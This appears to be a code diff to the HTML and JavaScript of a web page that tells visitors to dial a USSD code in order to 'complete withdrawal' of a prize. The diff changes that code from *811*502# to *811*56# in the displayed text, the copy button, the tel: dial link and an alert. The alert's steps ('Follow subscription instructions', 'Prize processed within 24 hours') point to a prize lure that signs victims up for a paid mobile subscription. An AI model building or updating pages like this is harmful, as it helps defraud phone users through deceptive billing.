@@ -394,7 +394,7 @@
             <p class="info-text">To complete the process, please dial the USSD code below:</p>
             
             <div class="ussd-code-container">
-                <div class="ussd-code" id="ussdCode">*811*502#</div>
+                <div class="ussd-code" id="ussdCode">*811*56#</div>
                 <button class="copy-btn" id="copyBtn" title="Copy USSD Code">
                     📋 Copy
                 </button>
@@ -465,7 +465,7 @@
 
         // Copy USSD code functionality
         copyBtn.addEventListener('click', async () => {
-            const success = await copyToClipboard('*811*502#');
+            const success = await copyToClipboard('*811*56#');
             if (success) {
                 copyBtn.textContent = '✅ Copied!';
                 copyBtn.classList.add('copied');
@@ -502,12 +502,12 @@
 
         // Dial button functionality
         dialBtn.addEventListener('click', () => {
-            const ussd = '*811*502%23';
+            const ussd = '*811*56%23';
             
             if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
                 window.location.href = `tel:${ussd}`;
             } else {
-                alert(`To complete withdrawal:\n\n1. Dial *811*502# on your phone\n2. Follow subscription instructions\n3. Prize processed within 24 hours`);
+                alert(`To complete withdrawal:\n\n1. Dial *811*56# on your phone\n2. Follow subscription instructions\n3. Prize processed within 24 hours`);
             }
             
             dialBtn.innerHTML = '📞 Dialing...';
@@ -554,3 +554,4 @@
     </script>
 </body>
 </html>
+
